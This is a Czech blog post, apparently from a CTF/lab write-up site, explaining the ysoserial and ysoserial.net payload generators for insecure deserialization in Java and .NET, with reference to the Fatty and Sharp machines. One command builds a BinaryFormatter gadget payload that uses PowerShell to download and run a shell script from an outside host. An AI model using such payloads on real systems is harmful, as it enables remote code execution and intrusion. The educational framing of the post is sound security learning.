---
layout: post
author: Tomáš Matějíček
title: "ysoserial"
date: 2020-10-30
tags: nastroje deserialization java dotnet payload gadget-chain
---
## Úvod a kontext

V tomto projektu `ysoserial` neznamená "jeden nástroj na všechno", ale praktickou rodinu payload generátorů pro insecure deserialization. V Java světě typicky jako `ysoserial` JAR, v .NET světě jako příbuzný nástroj typu `ysoserial.net`. Společný princip je ale stejný: zvolit gadget chain, zabalit příkaz do serializovaného objektu a doručit ho místu, které slepě deserializuje nedůvěryhodný vstup.

Na [Fatty](/fatty) se podobný payload používá proti serverové Java logice v `changePw`. Na [Sharpu](/sharp) je potřeba vygenerovat .NET `BinaryFormatter` payload pro remoting endpoint. Právě to je jeho praktická role: neobjevuje deserializační chybu, ale převádí potvrzenou zranitelnost do spustitelného objektového řetězce. Širší bezpečnostní kontext je v článku [Insecure deserialization napříč stacky](/techniky/insecure-deserialization-napric-stacky).

## Co `ysoserial` v praxi řeší

`ysoserial` je payload generator pro deserializační gadget chainy. Prakticky odpovídá na otázky:

- jak z potvrzené deserializace udělat objekt, který při zpracování vykoná příkaz,
- jak zvolit gadget chain odpovídající cílovému stacku,
- a jak vyrobit serializovaný vstup ve formátu, který cílová aplikace očekává.

To je zásadní rozdíl proti běžné exploitaci webového formuláře nebo SQL injection. Tady se nehledá parametr pro shell. Tady se skládá objekt, který se během deserializace sám stane nosičem chování.

## Nejčastější scénáře využití v tomto projektu

### Java server přijímá serializovaný objekt od klienta

Na [Fatty](/fatty) se po login bypassu ukáže druhá, podstatnější chyba: server-side funkce `changePw` deserializuje objekt `ClientCredential` bez bezpečnostních omezení.

V té chvíli už nedává smysl další ruční lámání SQLi nebo náhodné zásahy do protokolu. Praktický další krok je připravit gadget payload přes `ysoserial` a doručit ho do místa, které objekt slepě zpracuje.

To je dobrý praktický pattern:

- první chyba otevře přístup k aplikaci nebo ke klientovi,
- druhá chyba je samotná deserializace,
- a `ysoserial` vytvoří objektový řetězec, který z ní udělá RCE.

### .NET remoting a `BinaryFormatter`

Na [Sharpu](/sharp) je situace jiná, ale princip stejný. Aplikace přijímá serializovaný objekt přes .NET remoting endpoint. Tady dává smysl použít .NET variantu nástroje:

```text
ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.14.4:8000/ps1/shell.ps1')"
```

Praktická hodnota neleží v syntaxi příkazu, ale v tom, že nástroj:

- zná konkrétní gadget chain,
- umí ho zabalit do formátu, který cílová služba očekává,
- a tím odstraní potřebu ručně skládat celý serializační objekt.

### Překlad deserializační hypotézy do ověřitelného payloadu

To je možná nejdůležitější praktická role `ysoserialu`. Mnoho řetězců končí u věty "aplikace deserializuje nedůvěryhodný vstup". Ale právě až payload generator odpoví na otázku, jestli je to:

- teoretická slabina,
- nebo skutečně vykonatelná cesta k RCE.

`ysoserial` tedy není průzkumný nástroj. Je to nástroj na technické dotažení už potvrzené chyby.

## Kdy je `ysoserial` nejlepší volba

Největší smysl dává tehdy, když:

- je potvrzené, že aplikace deserializuje nedůvěryhodný vstup,
- znáte nebo odhadujete použitý formát a stack,
- a potřebujete rychle ověřit nebo využít známý gadget chain.

V takových situacích ušetří velké množství ruční práce a chyb při skládání objektu.

## Co `ysoserial` neumí vyřešit za vás

`ysoserial`:

- sám neobjeví deserializační chybu,
- neřekne, který gadget chain na cíli skutečně funguje,
- neobchází ochrany mimo samotnou deserializaci,
- a neřeší doručení payloadu do správného endpointu.

Na [Fatty](/fatty) bylo nejdřív potřeba pochopit klient/server protokol. Na [Sharpu](/sharp) bylo potřeba znát remoting endpoint a formát. Nástroj až potom převádí tuhle znalost do konkrétního objektu.

## Nejčastější chyby při použití

### Záměna nástroje za důkaz zranitelnosti

Úspěšné vygenerování payloadu ještě neznamená, že:

- cílový stack obsahuje potřebný gadget,
- formát sedí,
- nebo že se objekt opravdu dostane k deserializátoru.

### Ignorování rozdílu mezi Java a .NET světem

V praxi jde o podobný princip, ale jiný ekosystém gadgetů a formátů. Je potřeba rozlišit:

- Java serializaci,
- .NET `BinaryFormatter` nebo jiné .NET formáty,
- a konkrétní nástroj nebo variantu odpovídající cíli.

### Příliš rychlé soustředění na payload místo na trust boundary

Skutečná chyba je vždy v tom, že server přijímá bohatý objekt od nedůvěryhodné vrstvy. `ysoserial` je až nástroj, který tu chybu operationalizuje.

## Nejčastější praktické scénáře

### Mám potvrzenou Java deserializaci a potřebuji gadget payload

To je [Fatty](/fatty).

### Mám potvrzený .NET remoting nebo `BinaryFormatter` vstup a potřebuji vykonat příkaz

To je [Sharp](/sharp).

### Potřebuji ověřit, že deserializační chyba je skutečně exploitatelná

To je obecně nejtypičtější role `ysoserialu` v praktickém útoku.

## Související články v projektu

- Rozbory: [Fatty](/fatty), [Sharp](/sharp)
- Techniky: [Insecure deserialization napříč stacky](/techniky/insecure-deserialization-napric-stacky)

## Co si odnést do praxe

- `ysoserial` je nejpraktičtější jako payload generator pro už potvrzenou deserializační chybu, ne jako objevovací nástroj.
- Největší hodnotu má ve chvíli, kdy už znáte stack, formát a místo, kam serializovaný objekt doručit.
- Skutečný problém není samotný nástroj, ale důvěra serveru v objekt přijatý od klienta nebo jiné nedůvěryhodné vrstvy.
